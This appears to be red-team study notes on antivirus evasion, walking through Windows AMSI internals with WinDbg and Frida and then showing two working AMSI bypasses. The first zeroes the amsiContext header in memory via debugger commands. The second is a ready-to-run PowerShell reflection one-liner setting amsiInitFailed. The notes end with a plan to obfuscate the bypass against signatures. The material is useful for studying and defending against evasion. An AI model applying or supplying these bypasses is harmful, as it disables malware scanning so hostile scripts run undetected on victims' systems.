## Advanced Antivirus Evasion
Detection routines built into locally-installed antivirus clients have access to limited processing power, because users will hate/not tolerate scans that overly consume a local machine's resources. Most antivirus vendors use a cloud-based resources + artificial intelligence to detect malicious behavior. This is making our job as red team super super difficult.

Our pervious TTPs download and execute code directly in memory without giving some cheap antivirus a chance to scan it. Microsoft introduce Antimalware Scan Interface (AMSI) in Windows 10 to combat memory based script code execution. ASMI contains APIs that allow antivirus products to scan PowerShell commands and script based attacks when they are executed.

Let's learn Windows Defender implement ASMI. We will start with some baseline knowledge with assembly code and WinDebugger. sorry no note here,  you gotta google online. im allready master on low level language on Windebugger thing. And [WinDeb](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools) Debugger tool. Here I give you some free chicken..

Basic Debugger Commands

Set a breakpoint with bp followed by a memory address or the name of a function
```
0:010> bp kernel32!writefile
```

**g** command continue execution after setting a break point

**p** command execute a single assembly instruction

**r** review all register values

or review a single register
```
0:000> r rax
rax=0000000000000004
```

**u** command to unassemble a specific address location, for example unassemble the next 5 instructions after instruction pointer , **L5** meaning 5 more instructions
```
0:000> u rip L5
KERNELBASE!WriteFile+0xf:
00007fff`cff400bf 57 push rdi
00007fff`cff400c0 4883ec60 sub rsp,60h
00007fff`cff400c4 498bd9 mov rbx,r9
00007fff`cff400c7 4c8bda mov r11,rdx
00007fff`cff400ca 488bf9 mov rdi,rcx
```
**dd** **dc** **dq** commands are used to dump memory content format as 32 bit, 32 bit with ASCII, and 64 bit respectively.

**ed** followed by the memory address we wish to edit and the new value to edit the value
```
0:000> dd rsp L1
00000063`4c93e8c8 9a465c0e
0:000> ed rsp 0
0:000> dd rsp L1
00000063`4c93e8c8 0
```

## AMSI baseline knowledge
![image](https://user-images.githubusercontent.com/24555370/144544889-b12729b6-1dca-4c5b-940e-f5e2dd98e71b.png)

The unmanaged dynamic link library AMSI.DLL is loaded into every PowerShell. The dll forwarded relevant information to Window Deferder through Remote Procedure Call(RPC).After Windows Defender analyzes the data, the result is sent back to AMSI.DLL inside the PowerShell process.

When PowerShell launched, it loads AMSI.DLL and call AmsiInitialize API, AmsiInitialize takes place before we are able to invoke any PowerShell
commands, which means we cannot influence it in
```
HRESULT AmsiInitialize(
LPCWSTR appName, -> name of the application
HAMSICONTEXT *amsiContext -> a pointer to a context structure that is populated by the function
);
```
Once AmsiInitialize is complete and the context structure is created, AMSI can parse the issued
commands. When we execute a PowerShell command, the AmsiOpenSession API is called. It accepts the amsiContext context structure and creates a session structure to
be used in all calls within that session.
```
HRESULT AmsiOpenSession(
HAMSICONTEXT amsiContext,
HAMSISESSION *amsiSession
);
```

Next AmsiScanString and AmsiScanBuffer are used to capture the console input or script content either as a string or as a binary buffer respectively
```
HRESULT AmsiScanBuffer(
HAMSICONTEXT amsiContext, -> amsi context buffer
PVOID buffer, -> pointer to the buffer containing the content to be scanned
ULONG length, -> length of the buffer
LPCWSTR contentName, -> input identifier
HAMSISESSION amsiSession, -> session structure
AMSI_RESULT *result -> pointer to a storage buffer for the scan result, a enum type, value 32768 indicates persence of malware, 1 is clean scan
);
```
Once Scan is complete, AmsiCloseSession is called to close the AMSI scanning session.

## Hook your powershell with Frida
Frida is a opensource tool allow us to hook a process and watch Win32APi through a python backend and display the result(return values, input arguments) with JavaScript. If we want to learn more ASMI behavior, we have hook the powershell with Frida to observe the API calls.

#### Setting up Frida
- 1.install python
- 2.install pip with python3 [get-pip.py](/05FightAdvancedAntivirus/get-pip.py)
- 3.install Frida with pip install frida-tools
- 4.add Frida tools to your PATH environment, it should be something like  C:\Users\mst\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.9_qp0\LocalCache\local-packages\Python39\Scripts;

#### Montior process(powershell) with Frida
- 1.Start a 64 bit powershell process and get the process ID ```Get-Process -Name powershell```
- 2.Open command prompt, and run ```frida-trace -p powershellPID -x amsi.dll -i Amsi* ``` 
- 3.modify the defult javascript output format, so what can get input/output values. In our case, we want to know what is going on with AmsiScanBuffer located at **C:\Users\\mst\__handlers__\amsi.dll\AmsiScanBuffer.js** [AmsiScanBuffer.js](/05FightAdvancedAntivirus/AmsiScanBuffer.js)
- 4.Now you can interact with powershll process and watch the API calls.

## Bypass AMSI in Powershell
#### Destory amsiContext header
Now we got everything set up, we can test our ttps to bypass AMSI. recall AmsiInitialize API has a argument amsiContext, a pointer to a context structure. The context structure is used for rest of the APIs call in asmi.dll. We will use Frida to locate context structure address in memory and then use WinDbg to inspect its content. 
- 1.run fria-trace to examin pwoershell command input, after typing a test input in powershell you will find amsiContext address  in frida
```
 3087 ms  [*] AmsiScanBuffer()
 3087 ms  |- amsiContext: 0x1774c453c00
 3087 ms  |- buffer: { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
```
- 2.Attached powershell to WinDbg and dump memory at 0x1774c453c00, identify AMSI static string at first four bytes. Thayt is intersting.
```
0:017> dc 0x1774c453c00
00000177`4c453c00  49534d41 00000000 32330e00 00000177  AMSI......32w...
00000177`4c453c10  4c581650 00000177 000026e0 00000000  P.XLw....&......
```
- 3.Let's unassemble the AmsiOpenSession function from the AMSI module and maybe we can determine if the first four bytes are being referenced in any way
```
0:017> u amsi!AmsiOpenSession
amsi!AmsiOpenSession:
00007ffb`2aa33560 e9a3cb8f0b      jmp     00007ffb`36330108
00007ffb`2aa33565 4885c9          test    rcx,rcx
00007ffb`2aa33568 7442            je      amsi!AmsiOpenSession+0x4c (00007ffb`2aa335ac)
00007ffb`2aa3356a 8139414d5349    cmp     dword ptr [rcx],49534D41h
00007ffb`2aa33570 753a            jne     amsi!AmsiOpenSession+0x4c (00007ffb`2aa335ac)
00007ffb`2aa33572 4883790800      cmp     qword ptr [rcx+8],0
00007ffb`2aa33577 7433            je      amsi!AmsiOpenSession+0x4c (00007ffb`2aa335ac)
00007ffb`2aa33579 4883791000      cmp     qword ptr [rcx+10h],0
```
hum, intersting, on line 4, you see the asembley code ```00007ffb`2aa3356a 8139414d5349    cmp     dword ptr [rcx],49534D41h``` a compare opcode is called, recall in x64 process, rcx is the first arugment of the function. The opcode is comparing the first function argument to a hex string 49534D41, which we know the ASCII repersentation of 49534D41h is AMSI. And the next instruction, ```jne     amsi!AmsiOpenSession+0x4c (00007ffb`2aa335ac)``` redirect the program flow to **amsi!AmsiOpenSession+0x4c** if the argument is not equale to 49534D41h/AMSI.
- 4.We can dig a little deeper to see what is in memory address **amsi!AmsiOpenSession+0x4c** using u command to display the instructions at desired address
```
0:017> u amsi!AmsiOpenSession+0x4C L3
amsi!AmsiOpenSession+0x4c:
00007ffb`2aa335ac b857000780      mov     eax,80070057h
00007ffb`2aa335b1 c3              ret
00007ffb`2aa335b2 cc              int     3
```
Intersting at address amsi!AmsiOpenSession+0x4c(00007ffb`2aa335ac), the instuction move hex value 80070057h into eax, recall eax store function's return variable. And We can see the next instruction is ret, return. Recall  AmsiOpenSession has a return type [HRESULT](https://docs.microsoft.com/en-us/windows/win32/seccrypto/common-hresult-values), quick googling, we find out that 80070057h is E_INVALIDARG, meaning one or more arguments are not valid.

- 5.If we can modify the rcx, the first argument to anything but ASMI, we redirect the AmsiOpenSession API to return error, maybe we could bypass the ASMI scan? Let's give it a try.we’ll place a breakpoint on AmsiOpenSession and trigger it by entering a PowerShell command. Once the breakpoint has been triggered, we’ll use ed to modify the first
four bytes of the context structure, and let execution continue

```
0:017> bp amsi!AmsiOpenSession
0:017> g
Breakpoint 0 hit
*** WARNING: Unable to verify checksum for C:\WINDOWS\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\7242d51cdca2ff9f6522a0c081fa3c4a\System.Management.Automation.ni.dll
amsi!AmsiOpenSession:
00007ffb`2aa33560 e9a3cb8f0b      jmp     00007ffb`36330108
0:009> dc rcx L1
00000177`4c453c00  49534d41                             AMSI
0:009> ed rcx 0
0:009> dc rcx L1
00000177`4c453c00  00000000                             ....
0:009> g
(868c.6d80): CLR exception - code e0434352 (first chance)
(868c.6d80): CLR exception - code e0434352 (first chance)
```
- 6.Let's run a malicious string in powershell, you will see on the left powershell process it print the malicious stirng with our bypass TTP. By corrupting the amsiContext header, we have effectively shut down AMSI without affecting PowerShell. We have effectively bypassed AMSI. Very nice.

![image](https://user-images.githubusercontent.com/24555370/144694463-24e66adb-4afc-4867-948d-094dd8f74e3f.png)

- 7.The method works, now we need to create a [BeatUpamsiContextHeader.ps1](/05FightAdvancedAntivirus/BeatUpHeader.ps1) to automate this process for us.. FYI the official name for this kind of attack is BeatUpamsiContextHeader powershell reflection ttps.

#### Attack AmsiInitialize fcuntion
Recall amsiContext? In the pervious TTPs, We destory the amsiContext header to bypass AMSI. This context structure is created by AmsiInitialize function.
We can manipulate a result variable set by AmsiInitialize, which also lead to AMSI bypass through amsiInitFailed field.
```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
The amsiInitFailed field is verified by AmsiOpenSession in the same manner as the amsiContext header, which leads to an error. This AMSI bypass  still works even though it was discovered in 2016, but the substrings ‘AmsiUtils’ and ‘amsiInitFailed’ have since been flagged as malicious.
We could reuse the dynamic discovery of types and fields from our amsiContext AMSI bypass to evade the signatures and reuse this bypass.

**TODO.Create the bypass TTP script using dynamic discovery type.**
P237
